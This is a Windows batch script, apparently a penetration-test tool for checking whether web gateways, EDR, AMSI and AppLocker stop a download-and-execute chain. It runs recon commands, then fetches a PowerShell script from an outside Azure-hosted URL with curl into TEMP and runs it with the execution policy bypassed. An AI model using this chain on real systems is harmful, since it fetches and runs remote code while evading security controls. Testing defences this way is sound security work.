@echo off

:: ----------------------------------------------------------
:: CONFIGURATION -- replace URL with your test server URL
:: ----------------------------------------------------------
set DOWNLOAD_URL=https://perfectworld.azurewebsites.net/test_ps.ps1
set OUTPUT_FILE=%TEMP%\pt_test_ps.ps1

:: ----------------------------------------------------------
:: STEP 1 -- Basic system recon (whoami, hostname, dir)
:: ----------------------------------------------------------
echo [*] Running basic recon commands...
echo.

echo [+] whoami:
whoami

echo.
echo [+] hostname:
hostname

echo.
echo [+] Current directory listing (dir):
dir /b /o:n

echo.

:: ----------------------------------------------------------
:: STEP 2 -- Download PS1 file from URL using curl
:: ----------------------------------------------------------
echo [*] Attempting to download PS1 file from:
echo     %DOWNLOAD_URL%
echo.

curl.exe -s -o "%OUTPUT_FILE%" -w "HTTP_STATUS:%%{http_code}" "%DOWNLOAD_URL%" > "%TEMP%\pt_curl_result.txt" 2>&1

:: Parse HTTP status code from curl output
findstr /C:"HTTP_STATUS:200" "%TEMP%\pt_curl_result.txt" >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [+] Download succeeded. HTTP 200 OK.
    echo [+] File saved to: %OUTPUT_FILE%
) else (
    echo [-] Download did not return HTTP 200.
    echo [-] This may indicate Umbrella/SWG blocked the download.
    type "%TEMP%\pt_curl_result.txt"
    del /f /q "%TEMP%\pt_curl_result.txt" >nul 2>&1
    goto :BLOCKED
)

del /f /q "%TEMP%\pt_curl_result.txt" >nul 2>&1

:: ----------------------------------------------------------
:: STEP 3 -- Verify file exists after download
:: ----------------------------------------------------------
if not exist "%OUTPUT_FILE%" (
    echo [-] File not found after download -- likely blocked by AV on write.
    goto :BLOCKED
)

for %%A in ("%OUTPUT_FILE%") do (
    echo [+] File confirmed on disk. Size: %%~zA bytes
)

echo.

:: ----------------------------------------------------------
:: STEP 4 -- Execute the downloaded PS1 via PowerShell
:: ----------------------------------------------------------
echo [*] Attempting to execute downloaded PS1 file via PowerShell...
echo.

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%OUTPUT_FILE%"

if %ERRORLEVEL% NEQ 0 (
    echo.
    echo [-] PowerShell execution returned non-zero exit code: %ERRORLEVEL%
    echo [-] Possible causes: ExecutionPolicy blocked, AMSI flagged script,
    echo [-]                  AppLocker blocked ps1 from TEMP, EDR killed process.
    goto :BLOCKED
)

:: ----------------------------------------------------------
:: STEP 5 -- Result: allowed
:: ----------------------------------------------------------
echo.
echo =============================================
echo   DOWNLOAD AND EXECUTION ALLOWED
echo   ^>^> EDR/AV/SWG did NOT block this chain ^<^<
echo =============================================
echo.
echo [!] If you see this message, review the following controls:
echo     - Cisco Umbrella SWG did not block the PS1 file download
echo     - EDR did not flag curl.exe downloading a .ps1 file
echo     - PowerShell ExecutionPolicy was bypassable
echo     - AppLocker/WDAC did not block execution from TEMP path
echo     - AMSI did not intercept the PowerShell script content
echo.
goto :CLEANUP

:: ----------------------------------------------------------
:: BLOCKED path
:: ----------------------------------------------------------
:BLOCKED
echo.
echo =============================================
echo   DOWNLOAD OR EXECUTION WAS BLOCKED
echo   ^>^> At least one control reacted ^<^<
echo =============================================
echo.
echo [*] Check the following for which control triggered:
echo     - Umbrella Dashboard: Reporting ^> Security Activity
echo     - Fortigate: Log ^& Report ^> Web Filter / IPS
echo     - Palo Alto: Monitor ^> Threat / URL Filtering
echo     - EDR console: Process tree for cmd.exe / curl.exe
echo.

:CLEANUP
:: ----------------------------------------------------------
:: CLEANUP -- remove downloaded file after test
:: ----------------------------------------------------------
if exist "%OUTPUT_FILE%" (
    del /f /q "%OUTPUT_FILE%" >nul 2>&1
    echo [*] Cleanup complete -- test file removed from disk.
)
echo.
